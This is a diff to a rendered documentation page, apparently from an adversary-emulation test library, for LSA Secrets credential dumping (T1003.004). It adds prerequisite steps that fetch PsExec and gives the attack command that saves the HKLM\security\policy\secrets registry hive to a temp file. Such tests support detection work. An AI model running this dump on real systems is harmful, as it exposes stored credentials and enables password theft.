@@ -454,6 +454,34 @@
     </a>
     <ul class="nav section-nav flex-column">
      <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#dependencies-run-with-powershell">
+       Dependencies:  Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+       !
+      </a>
+      <ul class="nav section-nav flex-column">
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#description-psexec-from-sysinternals-must-exist-on-disk-at-specified-location-psexec-exe">
+         Description: PsExec from Sysinternals must exist on disk at specified location (#{psexec_exe})
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#check-prereq-commands">
+         Check Prereq Commands:
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#get-prereq-commands">
+         Get Prereq Commands:
+        </a>
+       </li>
+      </ul>
+     </li>
+     <li class="toc-h4 nav-item toc-entry">
       <a class="reference internal nav-link" href="#attack-commands-run-with-command-prompt">
        Attack Commands: Run with
        <code class="docutils literal notranslate">
@@ -502,10 +530,39 @@
 When successful, the dumped file will be written to $env:Temp\secrets.
 Attackers may use the secrets key to assist with extracting passwords and enumerating other sensitive system information.
 https://pentestlab.blog/2018/04/04/dumping-clear-text-credentials/#:~:text=LSA%20Secrets%20is%20a%20registry,host%2C%20local%20security%20policy%20etc.</p>
-<p><strong>Supported Platforms:</strong> windows</p>
+<p><strong>Supported Platforms:</strong> windows
+Elevation Required (e.g. root or admin)</p>
+<div class="section" id="dependencies-run-with-powershell">
+<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!<a class="headerlink" href="#dependencies-run-with-powershell" title="Permalink to this headline">¶</a></h4>
+<div class="section" id="description-psexec-from-sysinternals-must-exist-on-disk-at-specified-location-psexec-exe">
+<h5>Description: PsExec from Sysinternals must exist on disk at specified location (#{psexec_exe})<a class="headerlink" href="#description-psexec-from-sysinternals-must-exist-on-disk-at-specified-location-psexec-exe" title="Permalink to this headline">¶</a></h5>
+</div>
+<div class="section" id="check-prereq-commands">
+<h5>Check Prereq Commands:<a class="headerlink" href="#check-prereq-commands" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nb">Test-Path</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1003</span><span class="p">.</span><span class="n">004</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">PsExec</span><span class="p">.</span><span class="n">exe</span><span class="p">)</span> <span class="p">{</span><span class="n">exit</span> <span class="n">0</span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span><span class="n">exit</span> <span class="n">1</span><span class="p">}</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="get-prereq-commands">
+<h5>Get Prereq Commands:<a class="headerlink" href="#get-prereq-commands" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-WebRequest</span> <span class="s2">&quot;https://download.sysinternals.com/files/PSTools.zip&quot;</span> <span class="n">-OutFile</span> <span class="s2">&quot;$env:TEMP\PSTools.zip&quot;</span>
+<span class="nb">Expand-Archive</span> <span class="nv">$env:TEMP</span><span class="p">\</span><span class="n">PSTools</span><span class="p">.</span><span class="n">zip</span> <span class="nv">$env:TEMP</span><span class="p">\</span><span class="n">PSTools</span> <span class="n">-Force</span>
+<span class="nb">New-Item</span> <span class="n">-ItemType</span> <span class="n">Directory</span> <span class="p">(</span><span class="nb">Split-Path</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1003</span><span class="p">.</span><span class="n">004</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">PsExec</span><span class="p">.</span><span class="n">exe</span><span class="p">)</span> <span class="n">-Force</span> <span class="p">|</span> <span class="nb">Out-Null</span>
+<span class="nb">Copy-Item</span> <span class="nv">$env:TEMP</span><span class="p">\</span><span class="n">PSTools</span><span class="p">\</span><span class="n">PsExec</span><span class="p">.</span><span class="n">exe</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1003</span><span class="p">.</span><span class="n">004</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">PsExec</span><span class="p">.</span><span class="n">exe</span> <span class="n">-Force</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1003</span><span class="o">.</span><span class="mi">004</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">1</span> <span class="o">-</span><span class="n">GetPreReqs</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
 <div class="section" id="attack-commands-run-with-command-prompt">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#attack-commands-run-with-command-prompt" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>#{psexec_exe} -accepteula -s reg save HKLM\security\policy\secrets %temp%\secrets```
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>PathToAtomicsFolder\T1003.004\bin\PsExec.exe -accepteula -s reg save HKLM\security\policy\secrets %temp%\secrets```
 </pre></div>
 </div>
 <div class="cell docutils container">
